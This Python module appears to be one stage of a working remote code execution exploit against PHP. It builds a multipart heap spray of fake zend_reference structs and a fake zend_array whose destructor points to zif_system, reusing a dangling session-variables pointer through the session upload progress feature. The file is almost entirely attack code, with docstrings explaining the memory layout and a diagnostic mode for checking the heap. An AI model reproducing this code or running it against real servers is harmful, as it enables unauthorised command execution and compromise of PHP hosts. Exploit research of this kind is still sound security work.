"""Fake-reference spray for the B2 stage (function pointer overwrite).

Sends a multipart request carrying a spray of values whose data holds fake
zend_reference structs every 32 bytes, plus an 'ht' field carrying the fake
zend_array (built by payloads.build_fake_hashtable).

The spray overwrites the dangling PS(http_session_vars) left by A2. When
the reference refcount is 1, zend_hash_destroy processes the fake array
at shutdown, calling pDestructor (= zif_system) on each bucket value.
The first bucket's value is a zend_string pointing to the command.

In diagnostic mode (rc=2), the destructor only decrements the refcount
without triggering the payload, useful for heap layout validation.
"""
from __future__ import annotations

import struct

from .transport import TransportConfig, send_plain

BOUNDARY = b"C" * 10


def _fake_ref(ptr: int, rc: int, val_type: int = 0x0107) -> bytes:
    """Build a single 32-byte fake zend_reference.

    Layout:
      +0x00 refcount (4 bytes) = rc (1 for exploit, 2 for diagnostic)
      +0x04 type (1 byte) = 0x0A (IS_REFERENCE)
      +0x08 ptr (8 bytes) = pointer to the fake zend_array
      +0x10 val.type (4 bytes) = val_type (byte at offset 0x11 must be nonzero)
    """
    rv = bytearray(32)
    struct.pack_into("<I", rv, 0, rc)
    rv[4] = 0x0A  # IS_REFERENCE
    struct.pack_into("<Q", rv, 8, ptr)
    struct.pack_into("<I", rv, 16, val_type)
    return bytes(rv)


def build_spray_value(vl: int, ptr: int, rc: int = 1,
                      val_type: int = 0x0107,
                      ref_start: int = 8, ref_step: int = 32) -> bytes:
    """Build a spray value filled with fake zend_references every ref_step bytes.

    The value is vl bytes long, with fake references starting at ref_start
    and repeating every ref_step bytes. Each reference points to ptr (the
    fake zend_array address).
    """
    v = bytearray(b"S" * vl)
    o = ref_start
    while o + 32 <= vl:
        v[o:o + 32] = _fake_ref(ptr, rc, val_type)
        o += ref_step
    return bytes(v)


def _make_name(prefix: bytes, i: int, nlen: int = 10) -> bytes:
    """Generate a field name with index padding."""
    b = prefix + ("%09d" % i).encode()
    return (b + b"x" * nlen)[:nlen]


def send_forge(cfg: TransportConfig, path: str, ht_addr: int,
               ht_data: bytes, vl: int = 384, n1: int = 500,
               n2: int = 495, rc: int = 1, name_len: int = 10,
               sid: str = "a" * 32, progress: str = "k0") -> bytes:
    """Build and send the B2 fake-reference spray request.

    The request layout:
      1. n1 spray fields (before ht): fill allocator bins with fake references
      2. 'ht' field: carries the fake zend_array (pDestructor = zif_system)
      3. PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS: trigger session handling
      4. n2 spray fields (after session fields): additional coverage

    The spray ensures that when ZendMM reuses the freed A2 memory, the new
    allocation lands on one of our fake references, which points to the fake
    zend_array containing the payload command.
    """
    spray = build_spray_value(vl, ht_addr, rc)

    def part(name: bytes, value: bytes) -> bytes:
        return (b"--" + BOUNDARY +
                b"\r\nContent-Disposition: form-data; name=\"" +
                name + b"\"\r\n\r\n" + value + b"\r\n")

    body = bytearray()
    for i in range(n1):
        body += part(_make_name(b"s", i, name_len), spray)
    body += part(b"ht", ht_data)
    body += part(b"PHPSESSID", sid.encode())
    body += part(b"PHP_SESSION_UPLOAD_PROGRESS", progress.encode())
    for i in range(n2):
        body += part(_make_name(b"t", i, name_len), spray)
    body += b"--" + BOUNDARY + b"--\r\n"

    return send_plain(cfg, path, bytes(body))
